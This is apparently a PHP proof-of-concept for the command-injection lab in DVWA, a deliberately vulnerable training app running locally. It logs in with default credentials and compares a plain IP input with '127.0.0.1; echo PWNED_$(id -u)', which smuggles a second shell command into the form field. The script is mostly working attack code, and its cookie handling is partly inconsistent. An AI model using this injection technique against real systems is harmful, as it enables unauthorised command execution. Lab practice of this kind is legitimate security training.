<?php
/* DVWA Command Injection (exec, low) PoC */
$TARGET = 'http://127.0.0.1:8080/vulnerabilities/exec/';
$LOGIN  = 'http://127.0.0.1:8080/login.php';
$USER = 'admin'; $PASS = 'password'; $TOKEN = '0'; // adjust to your setup

function http_post($url, $fields, $cookies = '') {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
    $body = curl_exec($ch);
    curl_close($ch);
    return $body;
}

/* --- login to get session cookie (default DVWA login) --- */
$ch = curl_init($LOGIN);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/dvwa_cookies.txt');
$loginPage = curl_exec($ch);
curl_close($ch);
if (preg_match('/name="user_token" value="([^"]+)"/', $loginPage, $m)) { $TOKEN = $m[1]; }
$cookies = implode('; ', [ 'PHPSESSID='.session_id() ]);
// PHP session won't carry over to curl cookie jar automatically; rely on jar:
$cookies = '';
$ch = curl_init($LOGIN);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/dvwa_cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/dvwa_cookies.txt');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'username' => $USER, 'password' => $PASS, 'Login' => 'Login', 'user_token' => $TOKEN
]));
curl_exec($ch);
curl_close($ch);

function grab_pre($html) {
    preg_match('/<pre>(.*?)<\/pre>/s', $html, $m);
    return $m[1] ?? '';
}

/* --- 1) NORMAL input: plain IP, no command injection --- */
$normal = http_post($TARGET, ['ip' => '127.0.0.1', 'Submit' => 'Submit'], $cookies);
$normalOut = grab_pre($normal);

/* --- 2) ATTACK input: IP + injected command chain --- */
$attack = http_post($TARGET, ['ip' => '127.0.0.1; echo PWNED_$(id -u)', 'Submit' => 'Submit'], $cookies);
$attackOut = grab_pre($attack);

$cookieText = file_get_contents('/tmp/dvwa_cookies.txt');

function extract_pre($h){ if(preg_match('/<pre>(.*?)<\/pre>/s',$h,$m)) return trim($m[1]); return ''; }

$normalOut = extract_pre($normal);
$attackOut = extract_pre($attack);

echo "=== NORMAL INPUT (127.0.0.1) ===\n";
echo $normalOut . "\n";
echo "=== ATTACK INPUT (127.0.0.1; echo PWNED_\$(id -u)) ===\n";
echo $attackOut . "\n";
echo "=== EXPECTED OBSERVABLE DIFFERENCE ===\n";
echo (strpos($attackOut, 'PWNED_') !== false)
    ? "VULNERABLE: injected command output 'PWNED_...' present in response.\n"
    : "Not observed (token/cookie/level mismatch likely).\n";
?>
